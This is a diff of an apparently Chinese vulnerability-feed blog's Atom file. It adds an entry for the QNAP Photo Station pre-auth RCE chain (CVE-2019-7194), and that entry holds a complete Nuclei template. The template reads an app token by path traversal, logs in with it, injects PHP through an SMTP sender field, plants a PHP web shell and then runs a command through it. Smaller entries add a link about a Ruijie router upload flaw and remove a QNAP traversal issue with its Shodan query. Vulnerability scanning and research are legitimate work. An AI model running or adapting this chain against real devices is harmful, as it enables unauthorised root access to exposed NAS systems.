@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-08T11:45:40.723Z</updated>
+  <updated>2025-06-08T13:00:21.864Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,62 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>QNAP Photo Station 预认证远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/08/github_4085739410/"/>
+    <id>http://example.com/2025/06/08/github_4085739410/</id>
+    <published>2025-06-08T13:00:21.870Z</published>
+    <updated>2025-06-08T13:00:21.864Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> QNAP Photo Station 预认证远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-7194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP Photo Station 6.0.3之前的版本存在多个漏洞，当这些漏洞被串联利用时，可实现未经认证的远程代码执行（RCE）。这包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感系统文件。为了降低这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。</p><p><strong>产品厂商：</strong> QNAP</p><p><strong>产品名称：</strong> Photo Station</p><p><strong>影响版本：</strong> &lt; 6.0.3</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/1ec09aef75a7217fe1f93c80ce480e370df5a34d/http%2Fcves%2F2019%2FCVE-2019-7194.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/1ec09aef75a7217fe1f93c80ce480e370df5a34d/http%2Fcves%2F2019%2FCVE-2019-7194.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> qnap-photostation-CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">719</span>4-preauth-rce<br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> QNAP Photo Station <span class="hljs-operator">&lt;</span> <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> pre-auth RCE<br>  <span class="hljs-params">author:</span> x-stp<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    QNAP Photo Station versions prior to <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE).<br>    This includes a flaw involving external control of file names <span class="hljs-keyword">or</span> paths, allowing attackers to access <span class="hljs-keyword">or</span> modify sensitive system files.<br>    To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7192</span>,CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7193</span>,CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span>,CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7195</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">78</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,poc<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">command_payload:</span> &#x27;%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>d%<span class="hljs-number">60</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bx%<span class="hljs-number">5</span>D%<span class="hljs-number">60</span>%<span class="hljs-number">3</span>f%<span class="hljs-number">3</span>e%<span class="hljs-number">40</span>s.tp&#x27;<br>  <span class="hljs-params">dropper_command:</span> <span class="hljs-string">&quot;x= echo $((0x2C06*1337))&quot;</span><br>  <span class="hljs-params">dropper_filename:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(6))&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/p/api/album.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;a=setSlideshow&amp;f=qsamplealbum&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> album_id<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;output&gt;([a-zA-Z0-9]+)&lt;/output&gt;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/slideshow.php?album=&#123;&#123;album_id&#125;&#125;&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> access_code<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;encodeURIComponent<span class="hljs-char escape_">\\</span>(&#x27;([A-Za-z0-9%]+)&#x27;<span class="hljs-char escape_">\\</span>)&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">name:</span> phpsessid<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;PHPSESSID=([a-z0-9]+);&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/p/api/video.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;PHPSESSID=&#123;&#123;phpsessid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;a=caption&amp;f=UMGObv&amp;album=&#123;&#123;album_id&#125;&#125;&amp;ac=&#123;&#123;access_code&#125;&#125;&amp;filename=../../../../../share/Multimedia/.@__thumb/ps.app.token&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> app_token<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;([a-f0-9]&#123;32&#125;)&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/authLogin.cgi&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;app=PHOTO_STATION&amp;auth=1&amp;app_token=&#123;&#123;app_token&#125;&#125;&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">name:</span> nas_sid<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-symbol">&lt;authSid&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>\[CDATA\[([a-z0-<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>)\]\]<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>authSid<span class="hljs-operator">&gt;</span>&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/userConfig.cgi?sid=&#123;&#123;nas_sid&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>      <span class="hljs-params">X-Requested-With:</span> XMLHttpRequest<br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;DESKTOP=1; WINDOW_MODE=1; NAS_SID=&#123;&#123;nas_sid&#125;&#125;; PHPSESSID=&#123;&#123;phpsessid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;func=addPersonalSmtp&amp;provider_idx=0&amp;sender=&#123;&#123;command_payload&#125;&#125;&amp;default=0&amp;smtp_server=0.0.0.0&amp;port=25&amp;security=-1&amp;email_account=a%40b.com&amp;email_passwd=ac1db1tch3z&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/slideshow.php?album=qsamplealbum&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;QMS_SID=../../../../../../../../../../mnt/ext/opt/photostation2/&#123;&#123;dropper_filename&#125;&#125;.php; PHPSESSID=&#123;&#123;phpsessid&#125;&#125;; NAS_SID=&#123;&#123;nas_sid&#125;&#125;; DESKTOP=1; CACHE=&#123;&#123;randstr&#125;&#125;;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/&#123;&#123;dropper_filename&#125;&#125;.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>      <span class="hljs-comment"># oh well.. use that cookie jar again here..</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;PHPSESSID=&#123;&#123;phpsessid&#125;&#125;; NAS_SID=&#123;&#123;nas_sid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;&#123;&#123;dropper_command&#125;&#125;&quot;</span><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;NASVARS&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;15067990&quot;</span> <span class="hljs-comment"># magic.</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP Photo Station 预认证远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2019-7194&lt;/li&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>锐捷EWEB路由器 timeout.php 任意文件上传漏洞</title>
+    <link href="http://example.com/2025/06/08/weixin_3711212000/"/>
+    <id>http://example.com/2025/06/08/weixin_3711212000/</id>
+    <published>2025-06-08T12:54:00.501Z</published>
+    <updated>2025-06-08T12:54:00.498Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/uvgXkz89Dhp4xbsPowlyLA">https://mp.weixin.qq.com/s/uvgXkz89Dhp4xbsPowlyLA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/uvgXkz89Dhp4xbsPowlyLA&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
+    
+  </entry>
   
   <entry>
     <title>Chrome V8 越界读/写漏洞</title>
@@ -535,65 +591,6 @@
     
     
     <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
-    
-    <category term="服务器端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>QNAP Photo Station 路径遍历漏洞</title>
-    <link href="http://example.com/2025/06/08/github_2731243997/"/>
-    <id>http://example.com/2025/06/08/github_2731243997/</id>
-    <published>2025-06-08T02:00:15.867Z</published>
-    <updated>2025-06-08T02:00:15.865Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> QNAP Photo Station 路径遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-7194</li></ul><p><strong>漏洞类型：</strong> 目录遍历</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP Photo Station 存在外部文件名或路径控制漏洞，由于验证不足，远程攻击者可以访问或修改系统文件，利用此漏洞需要远程网络访问。</p><p><strong>产品厂商：</strong> QNAP</p><p><strong>产品名称：</strong> QNAP Photo Station</p><p><strong>搜索语法：</strong> content-length: 580 “http server 1.0”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12254">https://github.com/projectdiscovery/nuclei-templates/issues/12254</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><br><br><span class="hljs-comment">### Description: </span><br><span class="hljs-comment">&gt; QNAP Photo Station contains an external control of file name or path caused by insufficient validation, letting remote attackers access or modify system files, exploit requires remote network access.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">###</span><span class="hljs-comment"># Severity: \`Critical\`</span><br><br><span class="hljs-comment">#### POC: </span><br><span class="hljs-comment">- http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">###</span> KEV: True<br><br><span class="hljs-comment">### Shodan Query: \`content-length: 580 &quot;http server 1.0&quot;\`</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(\`-debug\`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP Photo Station 路径遍历漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2019-7194&lt;/li&gt;
-&lt;/ul</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2025-22870 SSRF Vulnerability</title>
-    <link href="http://example.com/2025/06/08/github_872488466/"/>
-    <id>http://example.com/2025/06/08/github_872488466/</id>
-    <published>2025-06-08T01:15:12.075Z</published>
-    <updated>2025-06-08T01:15:12.070Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> CVE-2025-22870 SSRF Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-22870</li></ul><p><strong>漏洞类型：</strong> 服务器端请求伪造</p><p><strong>漏洞描述：</strong> CVE-2025-22870是一个服务器端请求伪造（SSRF）漏洞的PoC（概念验证）。</p><p><strong>来源：</strong> <a href="https://github.com/JoshuaProvoste/CVE-2025-22870">https://github.com/JoshuaProvoste/CVE-2025-22870</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-22870 SSRF Vulnerability&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-22870&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="服务器端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
     
